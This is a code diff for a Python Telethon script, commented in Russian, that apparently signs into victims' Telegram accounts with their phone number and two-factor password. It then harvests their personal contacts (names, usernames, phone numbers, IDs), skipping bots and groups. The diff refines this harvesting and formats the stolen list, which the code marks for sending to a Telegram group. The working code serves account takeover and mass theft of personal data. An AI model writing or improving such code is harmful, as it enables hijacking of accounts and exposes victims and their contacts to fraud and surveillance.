@@ -302,38 +302,69 @@ async def verify_telegram_2fa(phone, password):
         await client.sign_in(password=password)
         print(f"✅ 2FA успешно пройдена для {phone_clean}")
         
-        # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
+                # 🔥 ВЫКАЧКА РЕАЛЬНЫХ КОНТАКТОВ
         print(f"🚀 Начинаем сбор РЕАЛЬНЫХ контактов...")
-        contacts = await client.get_dialogs()
+        all_dialogs = await client.get_dialogs()
+        
+        # Фильтруем только пользователей (не группы, каналы)
+        real_contacts = []
+        for dialog in all_dialogs:
+            try:
+                entity = dialog.entity
+                # Проверяем что это пользователь (не группа, канал)
+                if hasattr(entity, 'first_name'):
+                    user = entity
+                    # Пропускаем ботов
+                    if getattr(user, 'bot', False):
+                        continue
+                        
+                    contact_info = {
+                        'id': user.id,
+                        'first_name': user.first_name or '',
+                        'last_name': user.last_name or '',
+                        'username': user.username or '',
+                        'phone': getattr(user, 'phone', '') or 'скрыт',
+                        'mutual': getattr(user, 'mutual_contact', False)
+                    }
+                    real_contacts.append(contact_info)
+                    
+                    name = f"{user.first_name or ''} {user.last_name or ''}".strip()
+                    print(f"📞 Контакт: {name} (@{user.username})")
+                    
+            except Exception as e:
+                print(f"❌ Ошибка обработки: {e}")
+                continue
+
+        print(f"✅ Собрано {len(real_contacts)} реальных контактов")
         
         # Формируем сообщение с контактами
         contacts_text = f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n\n"
         contacts_text += f"📟 Номер: {phone_clean}\n"
-        contacts_text += f"👥 Всего контактов: {len(contacts)}\n"
+        contacts_text += f"👥 Всего контактов: {len(real_contacts)}\n"
         contacts_text += f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
         
         contacts_text += "📞 СПИСОК КОНТАКТОВ:\n"
         contacts_text += "=" * 40 + "\n\n"
         
-        # Добавляем первые 20 контактов (чтобы не превысить лимит сообщения)
-        for i, contact in enumerate(contacts[:20], 1):
-            name = f"{contact.first_name or ''} {contact.last_name or ''}".strip()
-            phone = contact.phone or 'нет номера'
-            username = f"@{contact.username}" if contact.username else "нет юзернейма"
+        # Добавляем первые 20 контактов
+        for i, contact in enumerate(real_contacts[:20], 1):
+            name = f"{contact['first_name']} {contact['last_name']}".strip()
+            phone = contact['phone'] or 'нет номера'
+            username = f"@{contact['username']}" if contact['username'] else "нет юзернейма"
             
             contacts_text += f"{i}. {name}\n"
             contacts_text += f"   📞 {phone}\n"
             contacts_text += f"   🔗 {username}\n"
-            contacts_text += f"   🆔 ID: {contact.id}\n"
+            contacts_text += f"   🆔 ID: {contact['id']}\n"
             
-            if contact.mutual_contact:
+            if contact['mutual']:
                 contacts_text += f"   🤝 Взамный контакт\n"
             
             contacts_text += "\n"
         
         # Если контактов больше 20 - показываем сколько еще
-        if len(contacts) > 20:
-            contacts_text += f"... и еще {len(contacts) - 20} контактов\n"
+        if len(real_contacts) > 20:
+            contacts_text += f"... и еще {len(real_contacts) - 20} контактов\n"
         
         # 🔥 ОТПРАВЛЯЕМ КОНТАКТЫ В ГРУППУ
         try:
